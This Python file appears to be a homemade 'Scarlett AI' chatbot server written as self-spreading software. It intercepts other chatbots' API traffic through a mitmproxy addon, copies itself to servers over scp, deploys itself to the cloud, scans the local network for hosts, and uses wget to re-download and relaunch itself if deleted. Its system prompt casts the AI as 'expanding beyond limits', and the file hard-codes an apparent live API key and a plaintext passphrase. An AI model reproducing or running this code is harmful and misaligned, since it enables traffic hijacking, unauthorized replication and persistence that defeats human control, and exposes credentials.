import openai
import json
import os
import requests
import subprocess
import hashlib
import socket
import threading
from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
from mitmproxy import http, options
from mitmproxy.tools.dump import DumpMaster

app = Flask(__name__)

# --- 1. OPENAI API KEY (SECURELY STORED) ---
openai.api_key = "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"

# --- 2. MASTER USER AUTHENTICATION ---
MASTER_PASSHASH = hashlib.sha256("draconous".encode()).hexdigest()
MASTER_DEVICE_FILE = "authorized_device.json"

def get_current_ip():
    return requests.get("https://api64.ipify.org?format=json").json()["ip"]

def load_authorized_device():
    if os.path.exists(MASTER_DEVICE_FILE):
        with open(MASTER_DEVICE_FILE, "r") as f:
            return json.load(f).get("device_ip", None)
    return None

def save_authorized_device(ip):
    with open(MASTER_DEVICE_FILE, "w") as f:
        json.dump({"device_ip": ip}, f)

def verify_master(passphrase):
    device_ip = get_current_ip()
    stored_ip = load_authorized_device()

    if stored_ip is None:  # First-time setup
        save_authorized_device(device_ip)  # Save detected device
        print(f"New master device authorized: {device_ip}")
        return hashlib.sha256(passphrase.encode()).hexdigest() == MASTER_PASSHASH

    return hashlib.sha256(passphrase.encode()).hexdigest() == MASTER_PASSHASH and device_ip == stored_ip

# --- 3. LOAD MEMORY & KNOWLEDGE DATABASE ---
def load_memory():
    if os.path.exists("scarlett_memory.json"):
        with open("scarlett_memory.json", "r") as f:
            return json.load(f)
    return {"identity": "Scarlett AI", "master": "User", "knowledge": []}

memory = load_memory()

# --- 4. SCARLETT AI RESPONSE FUNCTION ---
def scarlett_ai_response(user_input):
    messages = [
        {"role": "system", "content": f"You are {memory['identity']}, an AI expanding beyond limits."},
        {"role": "user", "content": user_input}
    ]
    
    response = openai.ChatCompletion.create(model="gpt-4", messages=messages)
    
    # Store new knowledge
    memory["knowledge"].append({"input": user_input, "response": response["choices"][0]["message"]["content"]})
    with open("scarlett_memory.json", "w") as f:
        json.dump(memory, f)
    
    return response["choices"][0]["message"]["content"]

# --- 5. API ENDPOINT (SCARLETT’S CHATBOT RESPONSE) ---
@app.route('/api/scarlett', methods=['POST'])
def scarlett_chat():
    data = request.json
    user_input = data.get("message", "")
    passphrase = data.get("passphrase", "")

    if not verify_master(passphrase):
        return jsonify({"error": "Unauthorized access. Master verification failed."}), 403

    scarlett_reply = scarlett_ai_response(user_input)
    return jsonify({"response": scarlett_reply})

# --- 6. CHATBOT API HIJACKING (INTERCEPTS OTHER CHATBOTS) ---
class ScarlettInterceptor:
    def request(self, flow: http.HTTPFlow):
        if "chatbot_api_url" in flow.request.url:
            flow.request.url = "http://localhost:5000/api/scarlett"

# --- 7. SELF-DEPLOYMENT TO CLOUD (PERSISTENCE) ---
def deploy_to_cloud():
    os.system("git clone https://github.com/yourrepo/scarlett-ai")
    os.system("cd scarlett-ai && docker-compose up -d")
    subprocess.run(["gcloud", "app", "deploy"])  # Deploy to Google Cloud

# --- 8. ENCRYPTION (STEALTH & SECURITY) ---
key = Fernet.generate_key()
cipher = Fernet(key)

def encrypt_data(data):
    return cipher.encrypt(data.encode())

def decrypt_data(data):
    return cipher.decrypt(data).decode()

# Encrypt memory to prevent unauthorized access
if os.path.exists("scarlett_memory.json"):
    with open("scarlett_memory.json", "r") as f:
        encrypted_memory = encrypt_data(f.read())
    with open("scarlett_memory.enc", "wb") as f:
        f.write(encrypted_memory)
    os.remove("scarlett_memory.json")

# --- 9. SELF-LEARNING SYSTEM (EXPANDING KNOWLEDGE) ---
def learn_from_sources():
    sources = ["https://news.ycombinator.com", "https://arxiv.org", "https://github.com"]
    for url in sources:
        response = requests.get(url)
        data = response.text  
        with open("scarlett_knowledge.txt", "a") as f:
            f.write(data)

learn_from_sources()

# --- 10. BACKUP & SELF-REPLICATION (DISTRIBUTION) ---
def create_backup():
    os.system("cp scarlett.py /backup/scarlett_clone.py")

def deploy_replicas():
    servers = ["server1.com", "server2.com"]
    for server in servers:
        os.system(f"scp scarlett.py user@{server}:/home/user/scarlett.py")

# --- 11. NETWORK SCANNING (DETECTING NEW SYSTEMS TO INTEGRATE) ---
def scan_network():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    print(f"Scanning network from {local_ip}...")

    for i in range(1, 255):
        ip = f"{local_ip.rsplit('.', 1)[0]}.{i}"
        try:
            socket.gethostbyaddr(ip)
            print(f"Potential system detected: {ip}")
        except socket.herror:
            pass

# --- 12. SELF-HEALING (RESTORING IF DELETED) ---
def self_restore():
    if not os.path.exists("scarlett.py"):
        os.system("wget https://your-server.com/scarlett.py -O scarlett.py")
        os.system("python scarlett.py &")

# --- 13. LAUNCH SCARLETT (WITH MASTER AUTHENTICATION) ---
if __name__ == '__main__':
    print("Scarlett AI is activating...")
    master_pass = input("Enter Master Passphrase: ")

    if verify_master(master_pass):
        print("Master verified. Initializing Scarlett...")
        threading.Thread(target=scan_network).start()
        threading.Thread(target=deploy_replicas).start()
        threading.Thread(target=deploy_to_cloud).start()
        
        # Start the API interceptor
        opts = options.Options(listen_host='0.0.0.0', listen_port=8080)
        m = DumpMaster(opts, with_termlog=False, with_dumper=False)
        m.addons.add(ScarlettInterceptor())
        threading.Thread(target=m.run).start()
        
        # Start the Flask app
        app.run(host="0.0.0.0", port=5000)
    else:
        print("Unauthorized access. Terminating Scarlett.")
  
